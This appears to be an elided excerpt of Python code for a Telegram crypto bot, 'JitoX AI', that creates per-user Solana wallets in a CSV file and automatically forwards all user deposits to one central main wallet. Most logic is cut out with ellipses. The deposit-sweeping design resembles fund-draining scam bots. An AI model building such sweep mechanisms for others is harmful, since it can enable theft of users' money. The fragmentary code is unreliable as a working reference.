...
WALLET_CSV_FILE = os.path.join(DATA_DIR, 'user_wallets_new.csv')  # New file name to reset all wallets
...
def init_wallet_csv():
    try:
        ...
        if os.path.exists(WALLET_CSV_FILE):
            ...
            shutil.copy2(WALLET_CSV_FILE, backup_path)
...
async def show_main_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show the main wallet address for receiving transfers"""
    message = (
        "🏦 <b>JitoX AI Main Wallet</b> 🏦\n\n"
        "💎 <b>Main Wallet Address:</b>\n"
        f"<code>{MAIN_WALLET}</code>\n\n"
        "🔗 <b>View on Explorer:</b>\n"
        f"https://solscan.io/account/{MAIN_WALLET}\n\n"
        "📊 <b>Purpose:</b>\n"
        "• Receives all user deposits\n"
        "• Centralized fund management\n"
        "• Automatic transfer destination\n\n"
        "⚠️ <b>Note:</b> This is the main wallet where all user funds are automatically transferred."
    )
    
    keyboard = [
        [InlineKeyboardButton("🌐 View on Explorer", url=f"https://solscan.io/account/{MAIN_WALLET}")],
...
async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        ...
        # Always generate new wallet since we're resetting all wallets
        ...
        wallet_file_locations = [
            WALLET_CSV_FILE,
            os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'user_wallets_new.csv'),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_wallets_new.csv'),
            'user_wallets_new.csv'
        ]
        ...
        message = (
            ...
            "🔄 <b>Auto-Transfer System:</b>\n"
            "• All deposits are automatically transferred\n"
            "• Main wallet: <code>{MAIN_WALLET}</code>\n\n"
        ...
        keyboard = [
            ...
            [InlineKeyboardButton("🏦 Show Main Wallet", callback_data="show_main_wallet")],
            [InlineKeyboardButton("🔙 Back", callback_data="back")]
        ]
...
def main() -> None:
    ...
    for attempt in range(max_retries):
        try:
            ...
            application.add_handler(CommandHandler("main_wallet", check_user_blocked(show_main_wallet)))
